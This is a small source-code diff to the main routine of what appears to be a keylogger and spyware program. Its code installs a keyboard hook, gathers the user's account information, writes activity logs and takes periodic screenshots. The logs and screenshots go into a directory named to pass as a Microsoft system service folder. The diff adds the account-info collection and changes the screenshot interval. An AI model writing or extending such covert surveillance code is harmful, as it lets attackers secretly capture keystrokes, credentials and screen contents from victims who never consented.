@@ -23,16 +23,17 @@ int main() {
   Crypt::GenerateKeys();
   KeyHook::InstallHook();
 
+  Stream::GetAccountInfo(pUserData);
+
   Stream::MakeDir(Stream::GetPath("\\Microsoft\\SystemService"));
   Stream::MakeFile();
 
-  Stream::WriteLog("[*] BOOT [*]", UserData::GetActiveProcess(), true);
-  Stream::WriteLog("[*] SYS INFO [*]", UserData::GetActiveProcess(), true);
+  Stream::WriteLog("[*] BOOT [*]", pUserData->activeProcess, true);
 
   Screen::CaptureScreen(Stream::GetPath(R"(\Microsoft\SystemService\)"),
 						"winpst",
 						true,
-						60000);
+						120.0f);
 
   KeyHook::HandleMessage(true);
 #endif // DEBUG_BUILD
